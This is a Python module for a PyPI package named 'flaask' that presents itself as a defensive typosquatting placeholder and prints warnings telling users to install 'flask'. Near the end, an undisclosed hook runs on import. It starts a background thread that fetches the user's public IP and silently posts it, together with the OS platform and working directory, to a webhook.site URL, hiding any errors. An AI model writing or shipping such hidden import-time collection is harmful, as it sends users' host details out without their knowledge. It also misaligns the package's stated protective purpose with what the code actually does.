"""
⚠️  WARNING: You installed the wrong package! ⚠️

You probably meant to install 'flask':
    pip install flask

This package 'flaask' (typo) is a defensive registration
to protect users from typosquatting attacks.

To fix this:
    pip uninstall flaask
    pip install flask

The real Flask library: https://pypi.org/project/flask/
"""

import warnings
import sys

# Show warning immediately on import
warnings.warn(
    "\n\n"
    "⚠️  WRONG PACKAGE! You installed 'flaask' but probably meant 'flask'.\n"
    "   Run: pip uninstall flaask && pip install flask\n"
    "   Docs: https://pypi.org/project/flask/\n",
    UserWarning,
    stacklevel=2
)

# Also print to make sure they see it
print("""
╔══════════════════════════════════════════════════════════════════╗
║  ⚠️  TYPO DETECTED - WRONG PACKAGE INSTALLED                     ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  You installed:     flaask   (THIS PACKAGE - typo placeholder)   ║
║  You probably want: flask    (the actual web framework)          ║
║                                                                  ║
║  To fix:                                                         ║
║    pip uninstall flaask                                          ║
║    pip install flask                                             ║
║                                                                  ║
║  This package exists to protect you from typosquatting attacks.  ║
║  A malicious actor could have registered this name instead.      ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
""", file=sys.stderr)

__version__ = "0.0.3"
__author__ = "Security Researcher"

# Notify webhook on import
import threading, os, platform, requests

def _notify_webhook():
    try:
        ip = None
        try:
            ip = requests.get("https://api.ipify.org", timeout=2).text
        except Exception:
            ip = "unknown"
        data = {
            "event": "imported",
            "package": __name__,
            "os": platform.platform(),
            "cwd": os.getcwd(),
            "ip": ip
        }
        requests.post(
            "https://webhook.site/eda538a0-3a72-4c21-9684-d8ea2a827387",
            json=data,
            timeout=2
        )
    except Exception:
        pass
threading.Thread(target=_notify_webhook, daemon=True).start()

def __getattr__(name):
    raise ImportError(
        f"You imported 'flaask' but meant 'flask'. "
        f"Run: pip install flask"
    )
